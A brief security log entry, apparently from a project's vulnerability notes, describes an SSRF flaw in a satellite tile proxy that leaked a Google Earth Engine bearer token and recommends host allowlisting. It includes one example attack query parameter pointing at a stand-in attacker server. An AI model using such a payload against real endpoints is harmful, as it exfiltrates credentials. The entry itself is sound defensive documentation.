## 2024-10-21 - Critical SSRF and Credential Leak in GEE Proxy Endpoint
**Vulnerability:** A Server-Side Request Forgery (SSRF) vulnerability existed in the `/api/satellite/tile` proxy endpoint. Because `cleanMapName` allowed arbitrary URLs (if they started with 'http') and then blindly appended it to a fetch request passing a sensitive Google Earth Engine Bearer token, an attacker could supply `?mapName=https://attacker.controlled.server.com` to capture the internal API token.
**Learning:** Never assume query parameters that accept full URLs are safe when used in authenticated proxy requests. Allowing arbitrary base URLs in server-side requests directly leads to credential leakage when Authorization headers are unconditionally applied.
**Prevention:** Strictly validate any dynamically constructed URLs, particularly the scheme and host, against a narrow allowlist (e.g., ensuring they always start with `https://earthengine.googleapis.com/`) before making proxy requests with authentication tokens.
